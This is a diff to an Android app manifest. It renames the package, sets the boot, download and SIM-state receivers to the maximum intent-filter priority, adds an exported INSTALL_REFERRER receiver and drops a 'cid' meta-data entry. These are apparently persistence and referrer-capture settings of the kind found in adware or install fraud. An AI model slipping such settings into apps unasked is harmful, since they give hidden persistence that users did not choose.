@@ -1,5 +1,5 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-          package="oom.tblib.sub">
+          package="oom.sub.com">
 
     <uses-permission android:name="android.permission.CAMERA"/>
 
@@ -61,7 +61,7 @@
         <receiver
             android:name=".s.S_receiver">
 
-            <intent-filter>
+            <intent-filter android:priority="2147483647">
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
                 <action android:name="android.intent.category.DEFAULT"/>
             </intent-filter>
@@ -73,7 +73,7 @@
                 <data android:scheme="package"/>
             </intent-filter>
 
-            <intent-filter>
+            <intent-filter android:priority="2147483647">
                 <action android:name="android.intent.action.DOWNLOAD_COMPLETE"/>
                 <action android:name="android.intent.action.DOWNLOAD_NOTIFICATION_CLICKED"/>
             </intent-filter>
@@ -103,7 +103,7 @@
                 <action android:name="android.intent.action.PHONE_STATE"/>
             </intent-filter>
 
-            <!--<intent-filter>-->
+            <!--<intent-filter android:priority="2147483647">-->
             <!--<action android:name="android.intent.action.SIM_STATE_CHANGED" />-->
             <!--</intent-filter>-->
 
@@ -113,15 +113,19 @@
 
         </receiver>
 
+        <receiver
+            android:name=".s.C_reveiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.android.vending.INSTALL_REFERRER"/>
+            </intent-filter>
+        </receiver>
+
         <service android:name=".s.S_service"/>
 
         <service
             android:name=".clean.Cb"
             android:exported="false"/>
-
-        <meta-data
-            android:name="cid"
-            android:value="${CID}"/>
 
         <meta-data
             android:name="d_log"
